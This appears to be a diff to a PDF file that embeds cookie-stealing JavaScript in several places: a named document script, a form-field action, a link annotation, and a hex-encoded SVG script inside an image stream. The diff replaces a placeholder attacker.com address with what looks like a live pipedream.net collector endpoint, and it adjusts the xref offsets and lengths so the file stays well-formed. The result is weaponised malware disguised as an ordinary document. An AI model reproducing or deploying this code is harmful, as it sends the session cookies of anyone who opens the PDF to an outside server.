@@ -31,10 +31,10 @@ endobj
 << /Names [(EmbeddedScript) 11 0 R] >>
 endobj
 11 0 obj
-<< /S /JavaScript /JS (var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie), true); xhr.send();) >>
+<< /S /JavaScript /JS (var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://eoy4evvlsf7y0jq.m.pipedream.net?cookie=' + encodeURIComponent(document.cookie), true); xhr.send();) >>
 endobj
 12 0 obj
-<< /Type /Annot /Subtype /Widget /FT /Tx /T (Field1) /V (Test) /Rect [100 100 200 120] /AA << /F << /S /JavaScript /JS (var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie), true); xhr.send();) >> >> >>
+<< /Type /Annot /Subtype /Widget /FT /Tx /T (Field1) /V (Test) /Rect [100 100 200 120] /AA << /F << /S /JavaScript /JS (var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://eoy4evvlsf7y0jq.m.pipedream.net?cookie=' + encodeURIComponent(document.cookie), true); xhr.send();) >> >> >>
 endobj
 13 0 obj
 << /Length 84 >>
@@ -46,12 +46,12 @@ Q
 endstream
 endobj
 14 0 obj
-<< /Type /Annot /Subtype /Link /Rect [100 150 200 170] /A << /S /JavaScript /JS (var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie), true); xhr.send();) >> >>
+<< /Type /Annot /Subtype /Link /Rect [100 150 200 170] /A << /S /JavaScript /JS (var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://eoy4evvlsf7y0jq.m.pipedream.net?cookie=' + encodeURIComponent(document.cookie), true); xhr.send();) >> >>
 endobj
 15 0 obj
-<< /Type /XObject /Subtype /Image /Width 100 /Height 100 /Filter /ASCIIHexDecode /Length 120 >>
+<< /Type /XObject /Subtype /Image /Width 100 /Height 100 /Filter /ASCIIHexDecode /Length 114 >>
 stream
-3C73766720786D6C6E733D22687474703A2F2F7777772E77332E6F72672F323030302F737667223E3C7363726970743E766172207868723D6E657720584D4C487474705265717565737428293B7868722E6F70656E2827474554272C272768747470733A2F2F61747461636B65722E636F6D2F737465616C3F636F6F6B69653D272B656E636F6465555249436F6D706F6E656E7428646F63756D656E742E636F6F6B6965292C74727565293B7868722E73656E6428293B3C2F7363726970743E3C2F7376673E
+3C73766720786D6C6E733D22687474703A2F2F7777772E77332E6F72672F323030302F737667223E3C7363726970743E766172207868723D6E657720584D4C487474705265717565737428293B7868722E6F70656E2827474554272C272768747470733A2F2F656F79346576766C73663779306A712E6D2E70697065647265616D2E6E65743F636F6F6B69653D272B656E636F6465555249436F6D706F6E656E7428646F63756D656E742E636F6F6B6965292C74727565293B7868722E73656E6428293B3C2F7363726970743E3C2F7376673E
 endstream
 endobj
 xref
@@ -71,9 +71,9 @@ xref
 0000000723 00000 n 
 0000000855 00000 n 
 0000001000 00000 n 
-0000001145 00000 n 
+0000001133 00000 n 
 trailer
 << /Size 16 /Root 1 0 R >>
 startxref
-1289
+1283
 %%EOF
